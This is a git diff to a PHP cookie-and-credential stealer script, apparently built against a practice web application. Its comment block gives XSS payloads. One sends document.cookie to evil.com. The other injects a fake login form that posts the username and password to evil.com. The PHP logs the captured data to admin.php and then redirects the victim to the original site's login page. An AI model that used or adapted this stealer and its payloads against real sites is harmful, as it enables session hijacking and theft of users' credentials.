@@ -1,9 +1,20 @@
 <?php
-
 /*
-Usage:
-<script>location.href='http://xxxxxx.fr/c.php?c='+escape(document.cookie)</script> 
+Usage for cookies:
+<script>location.href='http://evil.com/c.php?c='+escape(document.cookie)</script> 
+
+Usage for user/password:
+<sCriPt>
+document.getElementsByName('XSS')[0].style.display = "none";
+var div = document.createElement('div');
+div.className = 'vulnerable_code_area';
+div.innerHTML = '<form name="evil" action="http://evil.com/c/c.php" method="GET"><p>User login:<br/><br/><label><b>Username: </b></label><input type="text" placeholder="Enter user name" name="uname" required><br/><label><b>Password:  </b></label><input type="password" placeholder="Enter Password" name="psw" required><br/><br/><button type="submit">Login</button></p></form>';
+document.getElementsByClassName('vulnerable_code_area')[0].appendChild(div);
+</sCriPt>
+
+
 */
+
 	function addToStealed($file, $ip, $host, $navigator, $date, $heure, $provenance, $data)
 	{
 		$tmp		= file($file);
@@ -42,5 +53,5 @@ Usage:
 	addToStealed("admin.php", $ip, $host, $navigator, $date, $heure, $provenance, $data);
 	echo "Unauthorized Access";
 	// post "robo" redirection
-	header("Location: http://192.168.74.129/login.php");
+	header("Location: http://www.originalsite.com/login.php");
 ?>
